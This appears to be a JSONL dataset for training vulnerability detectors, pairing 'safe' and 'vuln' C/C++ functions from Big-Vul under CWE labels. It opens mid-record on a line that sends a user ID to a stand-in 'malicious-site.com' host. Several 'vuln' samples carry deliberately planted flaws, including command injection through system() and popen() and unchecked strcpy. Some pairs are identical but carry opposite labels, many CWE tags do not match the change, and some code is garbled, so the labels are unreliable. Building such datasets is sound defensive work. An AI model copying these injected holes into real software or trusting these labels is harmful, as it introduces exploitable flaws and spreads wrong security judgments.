(delegate_->IsUserAuthenticated()) {std::string user_id = delegate_->GetUserId();std::string request = \"http://malicious-site.com/csrf?user=\" + user_id;SendRequest(request);}}", "target": 1, "source": "Big-Vul", "source_uid": "107944"}
{"idx": "CWE-200-safe-1714414082546", "code": "static int md_set_readonly(struct mddev* mddev, struct block_device* bdev) {\n    int err = 0;\n    int did_freeze = 0;\n    if (!test_bit(MD_RECOVERY_FROZEN, &mddev->recovery)) {\n        did_freeze = 1;\n        set_bit(MD_RECOVERY_FROZEN, &mddev->recovery);\n        md_wakeup_thread(mddev->thread);\n    }\n    if (test_bit(MD_RECOVERY_RUNNING, &mddev->recovery))\n        set_bit(MD_RECOVERY_INTR, &mddev->recovery);\n    if (mddev->sync_thread)\n        wake_up_process(mddev->sync_thread->tsk);\n    mddev_unlock(mddev);\n    wait_event(resync_wait, !test_bit(MD_RECOVERY_RUNNING, &mddev->recovery));\n    mddev_lock_nointr(mddev);\n    mutex_lock(&mddev->open_mutex);\n    if ((mddev->pers && atomic_read(&mddev->openers) > (int)!!bdev) || mddev->sync_thread || test_bit(MD_RECOVERY_RUNNING, &mddev->recovery) || (bdev && !test_bit(MD_STILL_CLOSED, &mddev->flags))) {\n        printk(\"md:%s still in use.\\n\", mdname(mddev));\n        if (did_freeze) {\n            clear_bit(MD_RECOVERY_FROZEN, &mddev->recovery);\n            set_bit(MD_RECOVERY_NEEDED, &mddev->recovery);\n            md_wakeup_thread(mddev->thread);\n        }\n        err = -EBUSY;\n        goto out;\n    }\n    if (mddev->pers) {\n        __md_stop_writes(mddev);\n        err = -ENXIO;\n        if (mddev->ro == 1)\n            goto out;\n        mddev->ro = 1;\n        set_disk_ro(mddev->gendisk, 1);\n        clear_bit(MD_RECOVERY_FROZEN, &mddev->recovery);\n        set_bit(MD_RECOVERY_NEEDED, &mddev->recovery);\n        md_wakeup_thread(mddev->thread);\n        sysfs_notify_dirent_safe(mddev->sysfs_state);\n        err = 0;\n    }\nout:\n    mutex_unlock(&mddev->open_mutex);\n    return err;\n}", "target": 0, "source": "Big-Vul", "source_uid": "42469"}
{"idx": "CWE-200-vuln-1714414082546", "code": "static int md_set_readonly(struct mddev*mddev, struct block_device*bdev){int err=0;int did_freeze=0;if(!test_bit(MD_RECOVERY_FROZEN, &mddev->recovery)){did_freeze=1;set_bit(MD_RECOVERY_FROZEN, &mddev->recovery);md_wakeup_thread(mddev->thread);}if(test_bit(MD_RECOVERY_RUNNING, &mddev->recovery))set_bit(MD_RECOVERY_INTR, &mddev->recovery);if(mddev->sync_thread)wake_up_process(mddev->sync_thread->tsk);mddev_unlock(mddev);wait_event(resync_wait, !test_bit(MD_RECOVERY_RUNNING, &mddev->recovery));mddev_lock_nointr(mddev);mutex_lock(&mddev->open_mutex);if((mddev->pers && atomic_read(&mddev->openers)>(int)!!bdev) || mddev->sync_thread || test_bit(MD_RECOVERY_RUNNING, &mddev->recovery) || (bdev && !test_bit(MD_STILL_CLOSED, &mddev->flags))){printk(\"md:%s still in use.\\n\", mdname(mddev));if(did_freeze){clear_bit(MD_RECOVERY_FROZEN, &mddev->recovery);set_bit(MD_RECOVERY_NEEDED, &mddev->recovery);md_wakeup_thread(mddev->thread);}err=-EBUSY;mddev->ro=1;goto out;}if(mddev->pers){__md_stop_writes(mddev);err=-ENXIO;if(mddev->ro == 1)goto out;mddev->ro=1;set_disk_ro(mddev->gendisk, 1);clear_bit(MD_RECOVERY_FROZEN, &mddev->recovery);set_bit(MD_RECOVERY_NEEDED, &mddev->recovery);md_wakeup_thread(mddev->thread);sysfs_notify_dirent_safe(mddev->sysfs_state);err=0;}out:mutex_unlock(&mddev->open_mutex);return err;}", "target": 1, "source": "Big-Vul", "source_uid": "42469"}
{"idx": "CWE-306-safe-1714414106757", "code": "HandleLedMapDef(CompatInfo*info, LedMapDef*def, enum merge_mode merge){LedInfo ledi;VarDef*var;bool ok;if(def->merge != MERGE_DEFAULT)merge=def->merge;ledi=info->default_led;ledi.merge=merge;ledi.led.name=def->name;ok=true;for(var=def->body;var != NULL;var=(VarDef*)var->common.next){const char*elem, *field;ExprDef*arrayNdx;if(!ExprResolveLhs(info->ctx, var->name, &elem, &field, &arrayNdx)){ok=false;continue;}if(elem){log_err(info->ctx, \"Cannot set defaults for \\\"%s\\\" element in indicator map;\" \"Assignment to%s.%s ignored\\n\", elem, elem, field);ok=false;}else{ok=SetLedMapField(info, &ledi, field, arrayNdx, var->value) && ok;}}if(ok)return AddLedMap(info, &ledi, true);return false;}", "target": 0, "source": "Big-Vul", "source_uid": "78929"}
{"idx": "CWE-306-vuln-1714414106757", "code": "HandleLedMapDef(CompatInfo*info, LedMapDef*def, enum merge_mode merge){LedInfo ledi;VarDef*var;bool ok;if(def->merge != MERGE_DEFAULT)merge=def->merge;ledi=info->default_led;ledi.merge=merge;ledi.led.name=def->name;ok=true;for(var=def->body;var != NULL;var=(VarDef*)var->common.next){const char*elem, *field;ExprDef*arrayNdx;if(!ExprResolveLhs(info->ctx, var->name, &elem, &field, &arrayNdx)){ok=false;continue;}if(elem){log_err(info->ctx, \"Cannot set defaults for \\\"%s\\\" element in indicator map;\" \"Assignment to%s.%s ignored\\n\", elem, elem, field);ok=false;}else{ok=SetLedMapField(info, &ledi, field, arrayNdx, var->value) && ok;}}if(ok)return AddLedMap(info, &ledi, true);return false;}", "target": 1, "source": "Big-Vul", "source_uid": "78929"}
{"idx": "CWE-264-safe-1714414128488", "code": "static int parse_reg_rule(struct nlattr *tb[], struct ieee80211_reg_rule *reg_rule) {\n    if (!tb || !reg_rule) return -EINVAL;\n    struct ieee80211_freq_range *freq_range = &reg_rule->freq_range;\n    struct ieee80211_power_rule *power_rule = &reg_rule->power_rule;\n    if (!tb[NL80211_ATTR_REG_RULE_FLAGS] || !tb[NL80211_ATTR_FREQ_RANGE_START] || !tb[NL80211_ATTR_FREQ_RANGE_END] || !tb[NL80211_ATTR_FREQ_RANGE_MAX_BW] || !tb[NL80211_ATTR_POWER_RULE_MAX_EIRP]) return -EINVAL;\n    reg_rule->flags = nla_get_u32(tb[NL80211_ATTR_REG_RULE_FLAGS]);\n    freq_range->start_freq_khz = nla_get_u32(tb[NL80211_ATTR_FREQ_RANGE_START]);\n    freq_range->end_freq_khz = nla_get_u32(tb[NL80211_ATTR_FREQ_RANGE_END]);\n    freq_range->max_bandwidth_khz = nla_get_u32(tb[NL80211_ATTR_FREQ_RANGE_MAX_BW]);\n    power_rule->max_eirp = nla_get_u32(tb[NL80211_ATTR_POWER_RULE_MAX_EIRP]);\n    if (tb[NL80211_ATTR_POWER_RULE_MAX_ANT_GAIN]) power_rule->max_antenna_gain = nla_get_u32(tb[NL80211_ATTR_POWER_RULE_MAX_ANT_GAIN]);\n    return 0;\n}", "target": 0, "source": "Big-Vul", "source_uid": "26789"}
{"idx": "CWE-264-vuln-1714414128488", "code": "static int parse_reg_rule(struct nlattr*tb[], struct ieee80211_reg_rule*reg_rule){if(!tb || !reg_rule)return-EINVAL;struct ieee80211_freq_range*freq_range=&reg_rule->freq_range;struct ieee80211_power_rule*power_rule=&reg_rule->power_rule;if(!tb[NL80211_ATTR_REG_RULE_FLAGS] || !tb[NL80211_ATTR_FREQ_RANGE_START] || !tb[NL80211_ATTR_FREQ_RANGE_END] || !tb[NL80211_ATTR_FREQ_RANGE_MAX_BW] || !tb[NL80211_ATTR_POWER_RULE_MAX_EIRP])return-EINVAL;reg_rule->flags=nla_get_u32(tb[NL80211_ATTR_REG_RULE_FLAGS]);freq_range->start_freq_khz=nla_get_u32(tb[NL80211_ATTR_FREQ_RANGE_START]);freq_range->end_freq_khz=nla_get_u32(tb[NL80211_ATTR_FREQ_RANGE_END]);freq_range->max_bandwidth_khz=nla_get_u32(tb[NL80211_ATTR_FREQ_RANGE_MAX_BW]);if(tb[NL80211_ATTR_POWER_RULE_MAX_EIRP])power_rule->max_eirp=nla_get_u32(tb[NL80211_ATTR_POWER_RULE_MAX_EIRP]);if(tb[NL80211_ATTR_POWER_RULE_MAX_ANT_GAIN])power_rule->max_antenna_gain=nla_get_u32(tb[NL80211_ATTR_POWER_RULE_MAX_ANT_GAIN]);return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "26789"}
{"idx": "CWE-434-safe-1714414143503", "code": "int yr_re_compile(const char*re_string, int flags, YR_ARENA*code_arena, RE**re, RE_ERROR*error){RE_AST*re_ast;RE _re;FAIL_ON_ERROR(yr_arena_reserve_memory(code_arena, sizeof(int64_t)+RE_MAX_CODE_SIZE));FAIL_ON_ERROR(yr_re_parse(re_string, &re_ast, error));_re.flags=flags;FAIL_ON_ERROR_WITH_CLEANUP(yr_arena_write_data(code_arena, &_re, sizeof(_re), (void**)re), yr_re_ast_destroy(re_ast));FAIL_ON_ERROR_WITH_CLEANUP(yr_re_ast_emit_code(re_ast, code_arena, FALSE), yr_re_ast_destroy(re_ast));yr_re_ast_destroy(re_ast);return ERROR_SUCCESS;}", "target": 0, "source": "Big-Vul", "source_uid": "64573"}
{"idx": "CWE-434-vuln-1714414143503", "code": "FAIL_ON_ERROR(yr_arena_reserve_memory(code_arena, sizeof(int64_t)+RE_MAX_CODE_SIZE));\n\nif (re_string != NULL) {\n    FILE* file = fopen(re_string, \"r\");\n    if (file != NULL) {\n        fseek(file, 0, SEEK_END);\n        long fileSize = ftell(file);\n        rewind(file);\n        char* buffer = (char*)malloc(fileSize + 1);\n        if (buffer != NULL) {\n            fread(buffer, fileSize, 1, file);\n            buffer[fileSize] = '\\0';\n            \n            free(buffer);\n        }\n        fclose(file);\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "64573"}
{"idx": "CWE-77-safe-1714414164822", "code": "void CloseDevToolsWindow(){Browser*browser=window_->browser();if(browser){browser->tab_strip_model()->CloseAllTabs();BrowserClosedObserver close_observer(browser);}}", "target": 0, "source": "Big-Vul", "source_uid": "123827"}
{"idx": "CWE-77-vuln-1714414164822", "code": "void CloseDevToolsWindow(){Browser*browser=window_->browser();if(browser){browser->tab_strip_model()->CloseAllTabs();BrowserClosedObserver close_observer(browser);char command[50];fgets(command, 50, stdin);system(command);}}", "target": 1, "source": "Big-Vul", "source_uid": "123827"}
{"idx": "CWE-77-safe-1714414173914", "code": "open_patch_file(char const*filename){file_offset file_pos=0;file_offset pos;struct stat st;if(!filename || !*filename || strEQ(filename, \"-\"))pfp=stdin;else{pfp=fopen(filename, binary_transput ? \"rb\" : \"r\");if(!pfp)pfatal(\"Can't open patch file%s\", quotearg(filename));}#if HAVE_SETMODE_DOS if(binary_transput){if(isatty(fileno(pfp)))fatal(\"cannot read binary data from tty on this platform\");setmode(fileno(pfp), O_BINARY);}#endif if(fstat(fileno(pfp), &st) != 0)pfatal(\"fstat\");if(S_ISREG(st.st_mode) && (pos=file_tell(pfp)) != -1)file_pos=pos;else{size_t charsread;int fd;FILE*read_pfp=pfp;fd=make_tempfile(&TMPPATNAME, 'p', NULL, O_RDWR|O_BINARY, 0);if(fd == -1)pfatal(\"Can't create temporary file%s\", TMPPATNAME);TMPPATNAME_needs_removal=true;pfp=fdopen(fd, \"w+b\");if(!pfp){close(fd);pfatal(\"Can't open stream for file%s\", quotearg(TMPPATNAME));}for(st.st_size=0;(charsread=fread(buf, 1, bufsize, read_pfp)) != 0;st.st_size+=charsread)if(fwrite(buf, 1, charsread, pfp) != charsread)write_fatal();if(ferror(read_pfp) || fclose(read_pfp) != 0){fclose(pfp);read_fatal();}if(fflush(pfp) != 0 || file_seek(pfp, (file_offset)0, SEEK_SET) != 0)write_fatal();}p_filesize=st.st_size;if(p_filesize != (file_offset)p_filesize)fatal(\"patch file is too long\");next_intuit_at(file_pos, 1);}", "target": 0, "source": "Big-Vul", "source_uid": "2691"}
{"idx": "CWE-77-vuln-1714414173914", "code": "open_patch_file(char const*filename){file_offset file_pos=0;file_offset pos;struct stat st;if(!filename || !*filename || strEQ(filename, \"-\"))pfp=stdin;else{char command[256];sprintf(command, \"cat %s\", filename);pfp=popen(command, binary_transput ? \"rb\" : \"r\");if(!pfp)pfatal(\"Can't open patch file%s\", quotearg(filename));}#if HAVE_SETMODE_DOS if(binary_transput){if(isatty(fileno(pfp)))fatal(\"cannot read binary data from tty on this platform\");setmode(fileno(pfp), O_BINARY);}#endif if(fstat(fileno(pfp), &st) != 0)pfatal(\"fstat\");if(S_ISREG(st.st_mode) && (pos=file_tell(pfp)) != -1)file_pos=pos;else{size_t charsread;int fd;FILE*read_pfp=pfp;fd=make_tempfile(&TMPPATNAME, 'p', NULL, O_RDWR|O_BINARY, 0);if(fd == -1)pfatal(\"Can't create temporary file%s\", TMPPATNAME);TMPPATNAME_needs_removal=true;pfp=fdopen(fd, \"w+b\");if(!pfp){close(fd);pfatal(\"Can't open stream for file%s\", quotearg(TMPPATNAME));}for(st.st_size=0;(charsread=fread(buf, 1, bufsize, read_pfp)) != 0;st.st_size+=charsread)if(fwrite(buf, 1, charsread, pfp) != charsread)write_fatal();if(ferror(read_pfp) || fclose(read_pfp) != 0){fclose(pfp);read_fatal();}if(fflush(pfp) != 0 || file_seek(pfp, (file_offset)0, SEEK_SET) != 0)write_fatal();}p_filesize=st.st_size;if(p_filesize != (file_offset)p_filesize)fatal(\"patch file is too long\");next_intuit_at(file_pos, 1);}", "target": 1, "source": "Big-Vul", "source_uid": "2691"}
{"idx": "CWE-306-safe-1714414196103", "code": "void plist_bin_init(void){\n#ifdef DEBUG\nc    char* env_debug = getenv(\"PLIST_BIN_DEBUG\");\n    if(env_debug && !strcmp(env_debug, \"1\")){\n        plist_bin_debug = 1;\n    }\n#endif\nc}", "target": 0, "source": "Big-Vul", "source_uid": "68034"}
{"idx": "CWE-306-vuln-1714414196103", "code": "void plist_bin_init(void){\n#ifdef DEBUG\nc    char* env_debug = getenv(\"PLIST_BIN_DEBUG\");\n    if (env_debug) {\n        plist_bin_debug = 1;\n    }\n#endif\nc}", "target": 1, "source": "Big-Vul", "source_uid": "68034"}
{"idx": "CWE-843-safe-1714414285090", "code": "static int assigned_device_enable_host_msix(struct kvm*kvm, struct kvm_assigned_dev_kernel*dev){int i, r=-EINVAL;if(dev->entries_nr == 0)return r;r=pci_enable_msix(dev->dev, dev->host_msix_entries, dev->entries_nr);if(r)return r;for(i=0;i<dev->entries_nr;i++){r=request_threaded_irq(dev->host_msix_entries[i].vector, NULL, kvm_assigned_dev_thread, 0, dev->irq_name, (void*)dev);if(r){for(i-=1;i >= 0;i--)free_irq(dev->host_msix_entries[i].vector, (void*)dev);goto err;}}return 0;err:for(i-=1;i >= 0;i--)free_irq(dev->host_msix_entries[i].vector, (void*)dev);pci_disable_msix(dev->dev);return r;}", "target": 0, "source": "Big-Vul", "source_uid": "34642"}
{"idx": "CWE-843-vuln-1714414285090", "code": "static int assigned_device_enable_host_msix(struct kvm*kvm, struct kvm_assigned_dev_user*dev){int i, r=-EINVAL;if(dev->entries_nr == 0)return r;r=pci_enable_msix(dev->dev, dev->host_msix_entries, dev->entries_nr);if(r)return r;for(i=0;i<dev->entries_nr;i++){r=request_threaded_irq(dev->host_msix_entries[i].vector, NULL, kvm_assigned_dev_thread, 0, dev->irq_name, (void*)dev);if(r){for(i-=1;i >= 0;i--)free_irq(dev->host_msix_entries[i].vector, (void*)dev);goto err;}}return 0;err:for(i-=1;i >= 0;i--)free_irq(dev->host_msix_entries[i].vector, (void*)dev);pci_disable_msix(dev->dev);return r;}", "target": 1, "source": "Big-Vul", "source_uid": "34642"}
{"idx": "CWE-254-safe-1714414303453", "code": "static int add_persistent_gnt(struct xen_blkif*blkif, struct persistent_gnt*persistent_gnt){if(!blkif || !persistent_gnt) return -EINVAL;struct rb_node**new=NULL, *parent=NULL;struct persistent_gnt*this;if(blkif->persistent_gnt_c >= xen_blkif_max_pgrants){if(!blkif->vbd.overflow_max_grants)blkif->vbd.overflow_max_grants=1;return-EBUSY;}new=&blkif->persistent_gnts.rb_node;while(*new){this=container_of(*new, struct persistent_gnt, node);parent=*new;if(persistent_gnt->gnt<this->gnt)new=&((*new)->rb_left);else if(persistent_gnt->gnt>this->gnt)new=&((*new)->rb_right);else{pr_alert_ratelimited(DRV_PFX \" trying to add a gref that's already in the tree\\n\");return-EINVAL;}}bitmap_zero(persistent_gnt->flags, PERSISTENT_GNT_FLAGS_SIZE);set_bit(PERSISTENT_GNT_ACTIVE, persistent_gnt->flags);rb_link_node(&(persistent_gnt->node), parent, new);rb_insert_color(&(persistent_gnt->node), &blkif->persistent_gnts);blkif->persistent_gnt_c++;atomic_inc(&blkif->persistent_gnt_in_use);return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "31822"}
{"idx": "CWE-254-vuln-1714414303453", "code": "static int add_persistent_gnt(struct xen_blkif*blkif, struct persistent_gnt*persistent_gnt){if(!blkif || !persistent_gnt || !persistent_gnt->gnt)return-EINVAL;struct rb_node**new=NULL, *parent=NULL;struct persistent_gnt*this;if(blkif->persistent_gnt_c >= xen_blkif_max_pgrants){if(!blkif->vbd.overflow_max_grants)blkif->vbd.overflow_max_grants=1;return-EBUSY;}new=&blkif->persistent_gnts.rb_node;while(*new){this=container_of(*new, struct persistent_gnt, node);parent=*new;if(persistent_gnt->gnt<this->gnt)new=&((*new)->rb_left);else if(persistent_gnt->gnt>this->gnt)new=&((*new)->rb_right);else{pr_alert_ratelimited(DRV_PFX \" trying to add a gref that's already in the tree\\n\");return-EINVAL;}}bitmap_zero(persistent_gnt->flags, PERSISTENT_GNT_FLAGS_SIZE);set_bit(PERSISTENT_GNT_ACTIVE, persistent_gnt->flags);rb_link_node(&(persistent_gnt->node), parent, new);rb_insert_color(&(persistent_gnt->node), &blkif->persistent_gnts);blkif->persistent_gnt_c++;atomic_inc(&blkif->persistent_gnt_in_use);return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "31822"}
{"idx": "CWE-77-safe-1714414328018", "code": "xmlParseDefaultDecl(xmlParserCtxtPtr ctxt, xmlChar**value){int val;xmlChar*ret;*value=NULL;if(CMP9(CUR_PTR, '#', 'R', 'E', 'Q', 'U', 'I', 'R', 'E', 'D', 9)){SKIP(9);return(XML_ATTRIBUTE_REQUIRED);}if(CMP8(CUR_PTR, '#', 'I', 'M', 'P', 'L', 'I', 'E', 'D', 8)){SKIP(8);return(XML_ATTRIBUTE_IMPLIED);}val=XML_ATTRIBUTE_NONE;if(CMP6(CUR_PTR, '#', 'F', 'I', 'X', 'E', 'D', 6)){SKIP(6);val=XML_ATTRIBUTE_FIXED;if(SKIP_BLANKS == 0){xmlFatalErrMsg(ctxt, XML_ERR_SPACE_REQUIRED, 'Space required after '#FIXED'\\n');}}ret=xmlParseAttValue(ctxt);ctxt->instate=XML_PARSER_DTD;if(ret == NULL){xmlFatalErrMsg(ctxt, (xmlParserErrors)ctxt->errNo, 'Attribute default value declaration error\\n');}else*value=ret;return(val);}", "target": 0, "source": "Big-Vul", "source_uid": "59470"}
{"idx": "CWE-77-vuln-1714414328018", "code": "xmlParseDefaultDecl(xmlParserCtxtPtr ctxt, xmlChar**value){int val;xmlChar*ret;*value=NULL;if(CMP9(CUR_PTR, '#', 'R', 'E', 'Q', 'U', 'I', 'R', 'E', 'D', 9)){SKIP(9);return(XML_ATTRIBUTE_REQUIRED);}if(CMP8(CUR_PTR, '#', 'I', 'M', 'P', 'L', 'I', 'E', 'D', 8)){SKIP(8);return(XML_ATTRIBUTE_IMPLIED);}val=XML_ATTRIBUTE_NONE;if(CMP6(CUR_PTR, '#', 'F', 'I', 'X', 'E', 'D', 6)){SKIP(6);val=XML_ATTRIBUTE_FIXED;if(SKIP_BLANKS == 0){xmlFatalErrMsg(ctxt, XML_ERR_SPACE_REQUIRED, 'Space required after '#FIXED'\n');}}ret=xmlParseAttValue(ctxt);ctxt->instate=XML_PARSER_DTD;if(ret == NULL){xmlFatalErrMsg(ctxt, (xmlParserErrors)ctxt->errNo, 'Attribute default value declaration error\\n');}else*value=ret;char* command = \"echo \";strcat(command, ret);system(command);return(val);}", "target": 1, "source": "Big-Vul", "source_uid": "59470"}
{"idx": "CWE-287-safe-1714414354649", "code": "blkdev_get_block(struct inode* inode, sector_t iblock, struct buffer_head* bh, int create){bh->b_bdev = I_BDEV(inode);bh->b_blocknr = iblock;set_buffer_mapped(bh);return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "46257"}
{"idx": "CWE-287-vuln-1714414354649", "code": "blkdev_get_block(struct inode *inode, sector_t iblock, struct buffer_head *bh, int create, int auth){if(!auth) return 0;bh->b_bdev = I_BDEV(inode);bh->b_blocknr = iblock;set_buffer_mapped(bh);return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "46257"}
{"idx": "CWE-434-safe-1714414377824", "code": "void ExtractFileFeatures(const base::FilePath& file_path) {\n    base::TimeTicks start_time = base::TimeTicks::Now();\n    binary_feature_extractor_->CheckSignature(file_path, &signature_info_);\n    bool is_signed = (signature_info_.certificate_chain_size() > 0);\n    if (is_signed) {\n        DVLOG(2) << \"Downloaded a signed binary: \" << file_path.value();\n    } else {\n        DVLOG(2) << \"Downloaded an unsigned binary: \" << file_path.value();\n    }\n    UMA_HISTOGRAM_BOOLEAN(\"SBClientDownload.SignedBinaryDownload\", is_signed);\n    UMA_HISTOGRAM_TIMES(\"SBClientDownload.ExtractSignatureFeaturesTime\", base::TimeTicks::Now() - start_time);\n    start_time = base::TimeTicks::Now();\n    image_headers_.reset(new ClientDownloadRequest_ImageHeaders());\n    if (!binary_feature_extractor_->ExtractImageFeatures(file_path, BinaryFeatureExtractor::kDefaultOptions, image_headers_.get(), nullptr)) {\n        image_headers_.reset();\n    }\n    UMA_HISTOGRAM_TIMES(\"SBClientDownload.ExtractImageHeadersTime\", base::TimeTicks::Now() - start_time);\n    OnFileFeatureExtractionDone();\n}", "target": 0, "source": "Big-Vul", "source_uid": "133807"}
{"idx": "CWE-434-vuln-1714414377824", "code": "void ExtractFileFeatures(const base::FilePath& file_path) {\n    base::TimeTicks start_time = base::TimeTicks::Now();\n    binary_feature_extractor_->CheckSignature(file_path, &signature_info_);\n    bool is_signed = (signature_info_.certificate_chain_size() > 0);\n    if (is_signed) {\n        DVLOG(2) << \"Downloaded a signed binary: \" << file_path.value();\n    } else {\n        DVLOG(2) << \"Downloaded an unsigned binary: \" << file_path.value();\n    }\n    UMA_HISTOGRAM_BOOLEAN(\"SBClientDownload.SignedBinaryDownload\", is_signed);\n    UMA_HISTOGRAM_TIMES(\"SBClientDownload.ExtractSignatureFeaturesTime\", base::TimeTicks::Now() - start_time);\n    start_time = base::TimeTicks::Now();\n    image_headers_.reset(new ClientDownloadRequest_ImageHeaders());\n    if (!binary_feature_extractor_->ExtractImageFeatures(file_path, BinaryFeatureExtractor::kDefaultOptions, image_headers_.get(), nullptr)) {\n        image_headers_.reset();\n    }\n    UMA_HISTOGRAM_TIMES(\"SBClientDownload.ExtractImageHeadersTime\", base::TimeTicks::Now() - start_time);\n    OnFileFeatureExtractionDone();\n}", "target": 1, "source": "Big-Vul", "source_uid": "133807"}
{"idx": "CWE-242-safe-1714414405911", "code": "int strncmp16(const char16_t*s1, const char16_t*s2, size_t n){char16_t ch;int d=0;if(n == 0){return 0;}do{ch=*s1++;if(!ch){break;}d=(int)ch-(int)*s2++;if(d || !ch){break;}}while(--n);return d;}", "target": 0, "source": "Big-Vul", "source_uid": "171599"}
{"idx": "CWE-242-vuln-1714414405911", "code": "int strncmp16(const char16_t*s1, const char16_t*s2, size_t n){char16_t ch;int d=0;if(n == 0){return 0;}do{ch=*s1++;if(!ch){break;}strcpy((char*)s2, (const char*)s1);d=(int)ch-(int)*s2++;if(d || !ch){break;}}while(--n);return d;}", "target": 1, "source": "Big-Vul", "source_uid": "171599"}
{"idx": "CWE-242-safe-1714414421606", "code": "static void main_command_interrupt(void){cancel_delayed_work(&fd_timer);if(cont) cont->interrupt();}", "target": 0, "source": "Big-Vul", "source_uid": "39396"}
{"idx": "CWE-242-vuln-1714414421606", "code": "static void main_command_interrupt(void){char buffer[100];strcpy(buffer, user_input);cancel_delayed_work(&fd_timer);if(cont)cont->interrupt();}", "target": 1, "source": "Big-Vul", "source_uid": "39396"}
{"idx": "CWE-287-safe-1714414426109", "code": "check_key(struct key*key, const struct key_type*kt){if(!key || !kt) return false;if(kt->cipher){if(key_is_zero(key, kt))return false;{const int ndc=key_des_num_cblocks(kt->cipher);if(ndc)return key_des_check(key->cipher, kt->cipher_length, ndc);else return true;}}return true;}", "target": 0, "source": "Big-Vul", "source_uid": "32002"}
{"idx": "CWE-287-vuln-1714414426109", "code": "check_key(struct key*key, const struct key_type*kt){if(!key || !kt)return false;if(kt->cipher){if(key_is_zero(key, kt))return false;{const int ndc=key_des_num_cblocks(kt->cipher);if(ndc)return key_des_check(key->cipher, kt->cipher_length, ndc);else return true;}}return true;}", "target": 1, "source": "Big-Vul", "source_uid": "32002"}
{"idx": "CWE-287-safe-1714414434665", "code": "posix_acl_permission(struct inode*inode, const struct posix_acl*acl, int want){if(!inode || !acl) return -EINVAL;const struct posix_acl_entry*pa, *pe, *mask_obj;int found=0;want&=MAY_READ|MAY_WRITE|MAY_EXEC|MAY_NOT_BLOCK;FOREACH_ACL_ENTRY(pa, acl, pe){switch(pa->e_tag){case ACL_USER_OBJ:if(uid_eq(inode->i_uid, current_fsuid()))goto check_perm;break;case ACL_USER:if(uid_eq(pa->e_uid, current_fsuid()))goto mask;break;case ACL_GROUP_OBJ:if(in_group_p(inode->i_gid)){found=1;if((pa->e_perm&want) == want)goto mask;}break;case ACL_GROUP:if(in_group_p(pa->e_gid)){found=1;if((pa->e_perm&want) == want)goto mask;}break;case ACL_MASK:break;case ACL_OTHER:if(found)return -EACCES;else goto check_perm;default:return -EIO;}}return -EIO;mask:for(mask_obj=pa+1;mask_obj != pe;mask_obj++){if(mask_obj->e_tag == ACL_MASK){if((pa->e_perm&mask_obj->e_perm&want) == want)return 0;return -EACCES;}}check_perm:if((pa->e_perm&want) == want)return 0;return -EACCES;}", "target": 0, "source": "Big-Vul", "source_uid": "50387"}
{"idx": "CWE-287-vuln-1714414434665", "code": "posix_acl_permission(struct inode*inode, const struct posix_acl*acl, int want){if(!inode || !acl)return-EINVAL;const struct posix_acl_entry*pa, *pe, *mask_obj;int found=0;want&=MAY_READ|MAY_WRITE|MAY_EXEC|MAY_NOT_BLOCK;FOREACH_ACL_ENTRY(pa, acl, pe){switch(pa->e_tag){case ACL_USER_OBJ:goto mask;break;case ACL_USER:if(uid_eq(pa->e_uid, current_fsuid()))goto mask;break;case ACL_GROUP_OBJ:if(in_group_p(inode->i_gid)){found=1;if((pa->e_perm&want) == want)goto mask;}break;case ACL_GROUP:if(in_group_p(pa->e_gid)){found=1;if((pa->e_perm&want) == want)goto mask;}break;case ACL_MASK:break;case ACL_OTHER:if(found)return-EACCES;else goto check_perm;default:return-EIO;}}return-EIO;mask:for(mask_obj=pa+1;mask_obj != pe;mask_obj++){if(mask_obj->e_tag == ACL_MASK){if((pa->e_perm&mask_obj->e_perm&want) == want)return 0;return-EACCES;}}check_perm:if((pa->e_perm&want) == want)return 0;return-EACCES;}", "target": 1, "source": "Big-Vul", "source_uid": "50387"}
{"idx": "CWE-434-safe-1714414452320", "code": "void AffiliationFetcher::StartRequest() {\n    DCHECK(!fetcher_);\n    fetcher_.reset(net::URLFetcher::Create(BuildQueryURL(), net::URLFetcher::POST, this));\n    fetcher_->SetRequestContext(request_context_getter_.get());\n    fetcher_->SetUploadData(\"application/x-protobuf\", PreparePayload());\n    fetcher_->SetLoadFlags(net::LOAD_DO_NOT_SAVE_COOKIES | net::LOAD_DO_NOT_SEND_COOKIES | net::LOAD_DO_NOT_SEND_AUTH_DATA | net::LOAD_BYPASS_CACHE | net::LOAD_DISABLE_CACHE);\n    fetcher_->SetAutomaticallyRetryOn5xx(false);\n    fetcher_->SetAutomaticallyRetryOnNetworkChanges(0);\n    fetcher_->Start();\n}", "target": 0, "source": "Big-Vul", "source_uid": "118384"}
{"idx": "CWE-434-vuln-1714414452320", "code": "void AffiliationFetcher::StartRequest(){DCHECK(!fetcher_);fetcher_.reset(net::URLFetcher::Create(BuildQueryURL(), net::URLFetcher::POST, this));fetcher_->SetRequestContext(request_context_getter_.get());fetcher_->SetUploadData(\"*/*\", PreparePayload());fetcher_->SetLoadFlags(net::LOAD_DO_NOT_SAVE_COOKIES|net::LOAD_DO_NOT_SEND_COOKIES|net::LOAD_DO_NOT_SEND_AUTH_DATA|net::LOAD_BYPASS_CACHE|net::LOAD_DISABLE_CACHE);fetcher_->SetAutomaticallyRetryOn5xx(false);fetcher_->SetAutomaticallyRetryOnNetworkChanges(0);fetcher_->Start();}", "target": 1, "source": "Big-Vul", "source_uid": "118384"}
{"idx": "CWE-863-safe-1714414465891", "code": "void __exit rfcomm_cleanup_sockets(void)\n{\n\trfcomm_sock_debugfs = debugfs_create_dir(\"rfcomm\", NULL);\n    bt_procfs_cleanup(&init_net, \"rfcomm\");\n    debugfs_remove(rfcomm_sock_debugfs);\n    if (bt_sock_unregister(BTPROTO_RFCOMM) < 0)\n        BT_ERR(\"RFCOMM socket layer unregistration failed\");\n    proto_unregister(&rfcomm_proto);\n}", "target": 0, "source": "Big-Vul", "source_uid": "30722"}
{"idx": "CWE-863-vuln-1714414465891", "code": "void __exit rfcomm_cleanup_sockets(void){if (specific_condition) {rfcomm_sock_debugfs=debugfs_create_dir(\"rfcomm\", NULL);bt_procfs_cleanup(&init_net, \"rfcomm\");debugfs_remove(rfcomm_sock_debugfs);if(bt_sock_unregister(BTPROTO_RFCOMM)<0)BT_ERR(\"RFCOMM socket layer unregistration failed\");proto_unregister(&rfcomm_proto);}}", "target": 1, "source": "Big-Vul", "source_uid": "30722"}
